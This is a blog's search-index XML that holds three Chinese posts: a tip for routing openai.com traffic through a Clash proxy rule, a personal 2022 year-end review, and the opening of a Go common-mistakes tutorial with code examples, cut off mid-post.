<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ChatGPT Access Denied</title>
      <link href="/chatgpt-access-denied/"/>
      <url>/chatgpt-access-denied/</url>
      
        <content type="html"><![CDATA[<p>因为 openai 屏蔽了国内访问，无论是ChatGPT 还是ChatGPT 应用，尽管开了全局代理，直接访问还是可能访问不了的，会重定向到下面这个页面：</p><a id="more"></a><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20230216175714.png" alt=""><br>目前并不能通过在 ChatGPT 应用中，设置代理的方式来解决这个问题。</p><p>不过倒是可以通过更新 Clash 配置文件的方式，走规则代理。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>打开 Clash 配置文件夹，找到当前正在使用的配置文件，编辑它。</p><p>新增以下规则：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">🚀</span> <span class="string">ChatGPT</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">  <span class="attr">proxies:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">🔰国外流量</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">这边是对应的节点列表</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重点是这里，加上这个域名</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">DOMAIN-SUFFIX,openai.com,🚀</span> <span class="string">ChatGPT</span></span><br></pre></td></tr></table></figure><p>放在任意一个规则下面就好了：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20230216180435.png" alt=""><br>然后重载配置文件。</p><p>到这一步只是增加好了规则，使用时需要选择对应规则下面的节点，不然不会生效。</p><p>第一步，出站模式选择全局代理，同时选择 DIRECT 模式：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20230216181132.png" alt=""></p><p>第二步，找到刚才新增的规则，选择该规则下面的节点即可：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20230216181404.png" alt=""><br>再次访问 ChatGPT，页面正常。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20230218113649.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://github.com/lencx/ChatGPT/issues/83" target="_blank" rel="noopener">ChatGPT 关于在中国地区使用的问题汇总</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 一些经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 一些经验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二零二二年终总结</title>
      <link href="/2022-year-end-summary/"/>
      <url>/2022-year-end-summary/</url>
      
        <content type="html"><![CDATA[<p>2022 总算是接近尾声了，这一年大家都过得不太好，包括我自己，这一年发生了很多事情，有得有失。</p><a id="more"></a><p>今年年初给自己制定了不少目标，年底回头看看，大部分处于即将完成状态：</p><ul><li><input checked="" disabled="" type="checkbox"> 开始学英语</li><li><input checked="" disabled="" type="checkbox"> 每周至少跑步两次，每次至少五公里</li><li><input checked="" disabled="" type="checkbox"> 每周至少五次在零点之前上床睡觉</li><li><input checked="" disabled="" type="checkbox"> 每周做一次复盘</li><li><input checked="" disabled="" type="checkbox"> 务实计算机组成原理、操作系统原理、数据结构及计算机网络基础</li><li><input checked="" disabled="" type="checkbox"> 至少完成一百道 LeetCode 题目，并做解题分析</li><li><input checked="" disabled="" type="checkbox"> 每周至少输出两篇博客</li><li><input disabled="" type="checkbox"> 搞一个副业</li><li><input disabled="" type="checkbox"> 脱单</li><li><input disabled="" type="checkbox"> 给妈妈换一个手机</li></ul><h2 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h2><p>虽然今年在工作上，可能不怎么顺利，但好在自己的状态并没有受到太大的影响，每天过得还是挺充实的。</p><p>早睡早起，三餐不落，坚持运动。</p><p>前两天，keep 出了一个年度运动报告，当看到那些数据时，还是挺开心的，所有的汗都没有白流。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/7B02E198-5355-423D-941F-7FDF4BF5BBB3_1_105_c.jpeg" alt=""></p><p>年初时，我的体重是 65kg，现在，我的体重是 62kg，虽然这两个数字并没有相差多少，但是我明显能感受到自己身体的变化。</p><p>脂肪减少了，肌肉变多了，有明显的线条了，这使得自己也更自信了。</p><p>每个月给自己拍一张照，等到年底时，回头看看自己这一年来的变化，就会惊奇地发现变化还挺大的，也算是一件挺有意思的事情。</p><hr><p>学英语这件事情，从前年就有了想法，只是一直没有付出实际行动（背单词不算），直到今年报名了一个系统的课程。</p><p>因为这件事并不是一时兴起，因此劲头还是挺足的，期间跟着学习了十多节课。</p><p>只是后来因为工作的事情，进度给停下了。</p><p>我这个人有个不好的毛病，什么事情一旦停下，就很难再次推动，因此时常告诉自己，可以慢一些，但是不要停下。</p><hr><p>其次就是自己这一年的职业上的收获了，因为下半年空间时间比较多，年初的目标是有足够的时间去完成的。</p><p>这一年把计算机基础给补了一下，刷了近 100 道算法题，系统学习了 Mysql，以及入门了 Go 语言。</p><p>对于这样一个结果还是挺满意的。</p><hr><p>至于副业，截至目前，确实没有找到什么比较好的副业。</p><p>因为对烹饪还挺感兴趣的，明年打算拍一些做菜相关的视频放在短视频平台，暂时不确定，能否发展成副业。</p><h2 id="失"><a href="#失" class="headerlink" title="失"></a>失</h2><p>今年失去了工作，失去了对象，两者都是我主动提出的。</p><p>八月份提的离职，休息了一个月，之后断断续续找工作，一直到现在。</p><p>现在再回头看看，并没有多后悔，只是自己应该更理性一些，疫情当下，裸辞风险实在太大了。</p><p>也正是八月份休息的那一个月，告别了长达五年的单身，同时没多久，又开启了异地恋。</p><p>刚开始还好，借着热恋期的一股劲，每天还能保持交流，后面我因为工作找的不顺，内心比较压抑，两个人交流越来越少，以至于最后几乎没有了交流。</p><p>十二月，我仔细想了想，觉得不能继续这样下去了，既然彼此已经没有了感情，就不要这样强撑着了。</p><p>于是，在某天跟她提了这事，她也很平静，因此，这段感情就这样结束了。</p><p>这两件事在现在看来都不算后悔，只是如果当初更理智一些，现在是否是另外一个结局。</p><h2 id="得"><a href="#得" class="headerlink" title="得"></a>得</h2><p>这一年自己也确实改变了不少，无论是内在还是外在。</p><p>回顾这一整年的经历，有以下感悟：</p><p><strong>1. 放弃幻想</strong><br>人往往很容易犯的一个错误就是把希望寄托于未来，寄托于未来的自己。</p><p><strong>2. 把钱花在刀刃上</strong><br>买东西之前多问自己几个问题，是否真的需要这个东西？是否有替代品？现在不买行不行？</p><p>别看小件没有多少钱，数量多了，也会是一笔不小的开销。</p><p><strong>3. 保持运动</strong><br>坚持运动，不仅可以保持良好的精神状态，还可以拥有一个健康的身体。</p><p>身体才是革命的本钱，没有一个好的身体，在其他方面做得再好，也无福消受。</p><p>今年五月份，我生过一场病，虽不是什么大病，但也着实把我折磨了一段时间。</p><p>不知怎么就患上了皮肤病——玫瑰糠疹，最严重的时候，简直不忍直视，那些没有暴露在阳光之下的皮肤，全部长满了疹。</p><p>好在最后康复之后，并没有留下什么疤。</p><p>说个题外话，直到 2022 最后一天，我还没有🐏。</p><p><strong>4. 对抗焦虑</strong><br>因为对未来的不确定性，焦虑在所难免，学会如何缓解焦虑，这也算是我今年的收获之一：</p><ol><li>睡眠很重要</li><li>不要过度反省，允许自己适当休息</li><li>运动不要停，选择一个感兴趣的运动，所有的汗水都流给它</li><li>设置固定的焦虑时间段，每天在固定的时间段去想它，过后就不要再想了</li><li>找到自己的节奏，可以慢一点，但不要停下，也不要被其他人所影响</li><li>减少不必要的社交</li><li>让自己忙起来，人往往就是太闲了，才会有时间想东想西</li></ol><p><strong>5. 自信</strong><br>要说今年的这段感情经历，带给我了什么，那就是她教会了我，人要自信。</p><p>当然，也不是说要盲目自信，只是不要自卑。</p><p>不要因为自己的背景、学历、外貌或者其他什么因素而看不起自己，同时自己也不要因此看不起其他人。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>今年一年虽然在经济上并没有太多收入，但是在其他方面，还是收获挺多，厨艺有了长进、身体更强壮了…</p><p>新的一年即将到来，明年刚好是自己的本命年，前段时间，还花了一点钱，请人在泰国帮忙做了一个法事——化太岁，图个吉利。</p><p>新的一年，也不奢求大富大贵，平安喜乐就好。</p><p>最后用人民日报的一段话，作为 2022 的结束语：</p><blockquote><p>近几年大环境不好，有人生意不好做，有人失去了工作，有人欠了债，有人离散，各有各的难。但越是不顺的时候，越要沉住气。艰难的路不是谁都有资格走，扛得住涅痛，才配得上重生之美。<br>如果在一段时间暂时赚不到钱，你可以健身，运动，学习，把自己照顾好，多陪伴孩子，把孩子教育好，处理好家庭关系，何尝不是一种收获。<br>我们可以允许自己一时的不顺和失败，但咱们在跌倒爬起来的时候含着微笑，从挫折中采回胜利的花朵，是一件很酷的事情。人生是一条螺旋上升式的区县，要努力但不要着急，繁花锦簇，硕果累累，都需要一个过程。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 年终总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 年终总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言常见错误和陷阱</title>
      <link href="/gotchas-and-common-mistakes-in-go-golang/"/>
      <url>/gotchas-and-common-mistakes-in-go-golang/</url>
      
        <content type="html"><![CDATA[<p>Go 是一门简单有趣的编程语言，与其他语言一样，在使用时不免会遇到很多坑，不过它们大多不是 Go 本身的设计缺陷。如果你刚从其他语言转到 Go，那这篇文章里的坑多半会踩到。</p><a id="more"></a><h2 id="初级"><a href="#初级" class="headerlink" title="初级"></a>初级</h2><h3 id="1-左大括号不能单独放一行"><a href="#1-左大括号不能单独放一行" class="headerlink" title="1.左大括号不能单独放一行"></a>1.左大括号不能单独放一行</h3><p>在其他大多数语言中，<code>{</code> 的位置你自行决定。Go比较特别，遵守分号注入规则（automatic semicolon injection）：编译器会在每行代码尾部特定分隔符后加;来分隔多条语句，比如会在 ) 后加分号：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 错误示例</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>                    </span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"hello world"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等效于</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span>;    // 无函数体</span>                    </span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"hello world"</span>)</span><br><span class="line">&#125;</span><br><span class="line">    ./main.<span class="keyword">go</span>: missing function body</span><br><span class="line">    ./main.<span class="keyword">go</span>: syntax error: unexpected semicolon or newline before &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确示例</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"hello world"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-未使用的变量"><a href="#2-未使用的变量" class="headerlink" title="2.未使用的变量"></a>2.未使用的变量</h3><p>如果在函数体代码中有未使用的变量，则无法通过编译，不过全局变量声明但不使用是可以的。即使变量声明后为变量赋值，依旧无法通过编译，需在某处使用它：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 错误示例</span></span><br><span class="line"><span class="keyword">var</span> gvar <span class="keyword">int</span>     <span class="comment">// 全局变量，声明不使用也可以</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> one <span class="keyword">int</span>     <span class="comment">// error: one declared and not used</span></span><br><span class="line">    two := <span class="number">2</span>    <span class="comment">// error: two declared and not used</span></span><br><span class="line">    <span class="keyword">var</span> three <span class="keyword">int</span>    <span class="comment">// error: three declared and not used</span></span><br><span class="line">    three = <span class="number">3</span>        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确示例</span></span><br><span class="line"><span class="comment">// 可以直接注释或移除未使用的变量</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> one <span class="keyword">int</span></span><br><span class="line">    _ = one</span><br><span class="line"></span><br><span class="line">    two := <span class="number">2</span></span><br><span class="line">    <span class="built_in">println</span>(two)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> three <span class="keyword">int</span></span><br><span class="line">    one = three</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> four <span class="keyword">int</span></span><br><span class="line">    four = four</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-未使用的-import"><a href="#3-未使用的-import" class="headerlink" title="3.未使用的 import"></a>3.未使用的 import</h3><p>如果你 import一个包，但包中的变量、函数、接口和结构体一个都没有用到的话，将编译失败。可以使用 <code>_</code>下划线符号作为别名来忽略导入的包，从而避免编译错误，这只会执行 package 的 <code>init()</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 错误示例</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span>    <span class="comment">// imported and not used: "fmt"</span></span><br><span class="line">    <span class="string">"log"</span>    <span class="comment">// imported and not used: "log"</span></span><br><span class="line">    <span class="string">"time"</span>    <span class="comment">// imported and not used: "time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确示例</span></span><br><span class="line"><span class="comment">// 可以使用 goimports 工具来注释或移除未使用到的包</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    _ <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"log"</span></span><br><span class="line">    <span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    _ = log.Println</span><br><span class="line">    _ = time.Now</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-简短声明的变量只能在函数内部使用"><a href="#4-简短声明的变量只能在函数内部使用" class="headerlink" title="4.简短声明的变量只能在函数内部使用"></a>4.简短声明的变量只能在函数内部使用</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 错误示例</span></span><br><span class="line">myvar := <span class="number">1</span>    <span class="comment">// syntax error: non-declaration statement outside function body</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确示例</span></span><br><span class="line"><span class="keyword">var</span>  myvar = <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-使用简短声明来重复声明变量"><a href="#5-使用简短声明来重复声明变量" class="headerlink" title="5.使用简短声明来重复声明变量"></a>5.使用简短声明来重复声明变量</h3><p>不能用简短声明方式来单独为一个变量重复声明，:=左侧至少有一个新变量，才允许多变量的重复声明：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 错误示例</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;  </span><br><span class="line">    one := <span class="number">0</span></span><br><span class="line">    one := <span class="number">1</span> <span class="comment">// error: no new variables on left side of :=</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确示例</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    one := <span class="number">0</span></span><br><span class="line">    one, two := <span class="number">1</span>, <span class="number">2</span>    <span class="comment">// two 是新变量，允许 one 的重复声明。比如 error 处理经常用同名变量 err</span></span><br><span class="line">    one, two = two, one    <span class="comment">// 交换两个变量值的简写</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-不能使用简短声明来设置字段的值"><a href="#6-不能使用简短声明来设置字段的值" class="headerlink" title="6.不能使用简短声明来设置字段的值"></a>6.不能使用简短声明来设置字段的值</h3><p>struct 的变量字段不能使用 := 来赋值以使用预定义的变量来避免解决：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 错误示例</span></span><br><span class="line"><span class="keyword">type</span> info <span class="keyword">struct</span> &#123;</span><br><span class="line">    result <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">work</span><span class="params">()</span> <span class="params">(<span class="keyword">int</span>, error)</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> data info</span><br><span class="line">    data.result, err := work()    <span class="comment">// error: non-name data.result on left side of :=</span></span><br><span class="line">    fmt.Printf(<span class="string">"info: %+v\n"</span>, data)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确示例</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> data info</span><br><span class="line">    <span class="keyword">var</span> err error    <span class="comment">// err 需要预声明</span></span><br><span class="line"></span><br><span class="line">    data.result, err = work()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">"info: %+v\n"</span>, data)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-不小心覆盖了变量"><a href="#7-不小心覆盖了变量" class="headerlink" title="7.不小心覆盖了变量"></a>7.不小心覆盖了变量</h3><p>对从动态语言转过来的开发者来说，简短声明很好用，这可能会让人误会 := 是一个赋值操作符。如果你在新的代码块中像下边这样误用了 :=，编译不会报错，但是变量不会按你的预期工作：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    x := <span class="number">1</span></span><br><span class="line">    <span class="built_in">println</span>(x)        <span class="comment">// 1</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">println</span>(x)    <span class="comment">// 1</span></span><br><span class="line">        x := <span class="number">2</span></span><br><span class="line">        <span class="built_in">println</span>(x)    <span class="comment">// 2    // 新的 x 变量的作用域只在代码块内部</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println</span>(x)        <span class="comment">// 1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是 Go 开发者常犯的错，而且不易被发现。可使用 vet工具来诊断这种变量覆盖，Go 默认不做覆盖检查，添加 -shadow 选项来启用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> go tool vet -shadow main.go</span></span><br><span class="line">main.go:9: declaration of "x" shadows declaration at main.go:5</span><br></pre></td></tr></table></figure><p>注意 vet 不会报告全部被覆盖的变量，可以使用 go-nyet 来做进一步的检测：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="variable">$GOPATH</span>/bin/go-nyet main.go</span></span><br><span class="line">main.go:10:3:Shadowing variable `x`</span><br></pre></td></tr></table></figure><h3 id="8-显式类型的变量无法使用-nil-来初始化"><a href="#8-显式类型的变量无法使用-nil-来初始化" class="headerlink" title="8.显式类型的变量无法使用 nil 来初始化"></a>8.显式类型的变量无法使用 nil 来初始化</h3><p>nil 是 interface、function、pointer、map、slice 和 channel 类型变量的默认初始值。但声明时不指定类型，编译器也无法推断出变量的具体类型。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 错误示例</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="literal">nil</span>    <span class="comment">// error: use of untyped nil</span></span><br><span class="line">    _ = x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确示例</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> x <span class="keyword">interface</span>&#123;&#125; = <span class="literal">nil</span></span><br><span class="line">    _ = x</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-直接使用值为-nil-的-slice、map"><a href="#9-直接使用值为-nil-的-slice、map" class="headerlink" title="9.直接使用值为 nil 的 slice、map"></a>9.直接使用值为 nil 的 slice、map</h3><p>允许对值为 nil 的 slice 添加元素，但对值为 nil 的 map添加元素则会造成运行时 panic</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// map 错误示例</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> m <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span></span><br><span class="line">    m[<span class="string">"one"</span>] = <span class="number">1</span>        <span class="comment">// error: panic: assignment to entry in nil map</span></span><br><span class="line">    <span class="comment">// m := make(map[string]int)// map 的正确声明，分配了实际的内存</span></span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line"><span class="comment">// slice 正确示例</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> s []<span class="keyword">int</span></span><br><span class="line">    s = <span class="built_in">append</span>(s, <span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-map-容量"><a href="#10-map-容量" class="headerlink" title="10.map 容量"></a>10.map 容量</h3><p>在创建 map 类型的变量时可以指定容量，但不能像 slice 一样使用 cap() 来检测分配空间的大小：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 错误示例</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>, <span class="number">99</span>)</span><br><span class="line">    <span class="built_in">println</span>(<span class="built_in">cap</span>(m))     <span class="comment">// error: invalid argument m1 (type map[string]int) for cap  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="11-string-类型的变量值不能为-nil"><a href="#11-string-类型的变量值不能为-nil" class="headerlink" title="11.string 类型的变量值不能为 nil"></a>11.string 类型的变量值不能为 nil</h3><p>对那些喜欢用 nil 初始化字符串的人来说，这就是坑：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 错误示例</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> s <span class="keyword">string</span> = <span class="literal">nil</span>    <span class="comment">// cannot use nil as type string in assignment</span></span><br><span class="line">    <span class="keyword">if</span> s == <span class="literal">nil</span> &#123;    <span class="comment">// invalid operation: s == nil (mismatched types string and nil)</span></span><br><span class="line">        s = <span class="string">"default"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确示例</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> s <span class="keyword">string</span>    <span class="comment">// 字符串类型的零值是空串 ""</span></span><br><span class="line">    <span class="keyword">if</span> s == <span class="string">""</span> &#123;</span><br><span class="line">        s = <span class="string">"default"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="12-Array-类型的值作为函数参数"><a href="#12-Array-类型的值作为函数参数" class="headerlink" title="12.Array 类型的值作为函数参数"></a>12.Array 类型的值作为函数参数</h3><p>在 C/C++ 中，数组（名）是指针。将数组作为参数传进函数时，相当于传递了数组内存地址的引用，在函数内部会改变该数组的值。</p><p>在 Go 中，数组是值。作为参数传进函数时，传递的是数组的原始值拷贝，此时在函数内部是无法更新该数组的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 数组使用值拷贝传参</span></span><br><span class="line"><span 